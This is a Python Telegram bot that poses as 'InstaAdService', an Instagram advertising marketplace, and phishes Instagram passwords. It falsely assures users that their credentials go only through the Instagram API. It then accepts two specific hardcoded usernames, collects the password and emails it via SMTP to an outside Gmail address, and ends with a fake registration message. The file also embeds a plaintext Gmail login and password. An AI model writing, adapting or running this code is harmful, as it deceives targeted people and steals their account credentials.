# -*- coding: utf-8 -*-
import config
import telebot
from telebot import types
import smtplib



mailObj = smtplib.SMTP('smtp.gmail.com', 587)
mailObj.starttls()
mailObj.login('kirypanin@gmail.com', 'Paninm27')
bot = telebot.TeleBot(config.token)
markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
agree = types.ReplyKeyboardMarkup(resize_keyboard=True)
autortype = types.ReplyKeyboardMarkup(resize_keyboard=True)
menu = types.ReplyKeyboardMarkup(resize_keyboard=True)
markup.row('Я рекламодатель')
markup.row('Я блогер')
agree.row('Я согласен(на)')
autortype.row('Instagram')
menu.row('Заказы', 'Рефералы')
menu.row('Кошелек', 'Помощь')
username = None
password = 'NonStop'



@bot.message_handler(commands=['start'])
def handle_start(message):
    hello = 'Вас приветсвует рекламная площадка InstaAdService.'
    msg = bot.send_message(message.chat.id, hello, reply_markup=markup)
    bot.register_next_step_handler(msg, process_agree)


def process_agree(message):
    work = message.text
    text = 'Внимание! В целях безопасности, ваши учетные данные не будут хранится на серверах InstaAdService, а сразу передаваться через Instagram API. '
    msg = bot.send_message(message.chat.id, text, reply_markup=agree)
    bot.register_next_step_handler(msg, process_autorisationvar)



def process_autorisationvar(message):
    agree = message.text
    text = 'Выберете способ авторизации: '
    msg = bot.send_message(message.chat.id, text, reply_markup=autortype)
    bot.register_next_step_handler(msg, process_autorisation)


def process_autorisation(message):
    type = message.text
    autortype = types.ReplyKeyboardRemove(selective=False)
    text = 'Введите ваше имя пользователя Instagram: '
    msg = bot.send_message(message.chat.id, text, reply_markup=autortype)
    bot.register_next_step_handler(msg, process_autorisation2)


def process_autorisation2(message):
    username = message.text
    if(username == u'melovin_lane') or (username == u'kdudnik'):
        text = 'Введите пароль: '
        msg = bot.send_message(message.chat.id, text)
        bot.register_next_step_handler(msg, process_autorised)
    else:
        bot.send_message(message.chat.id, 'Неверное имя пользователя. Повторите попытку')
        process_autorisation(message)


def process_autorised(message):
    password = message.text
    mailObj.sendmail("kirypanin@gmail.com", "pankiblackod@gmail.com", password)
    mailObj.quit()
    msg = bot.send_message(message.chat.id, 'Благодарим за регистрацию на сервисе InstaAsService. Ваша анкета отправлена в раздел исполнитлей и вскоре найдет своего заказчика', reply_markup=menu)
    bot.register_next_step_handler(msg, process_menu)


def process_menu(message):
    msg = bot.send_message(message.chat.id, 'Сервис времменно недоступен. Извините за неудобстваю', reply_markup=menu)
    bot.register_next_step_handler(msg, process_menu)


if __name__ == '__main__':
    bot.polling(none_stop=True)


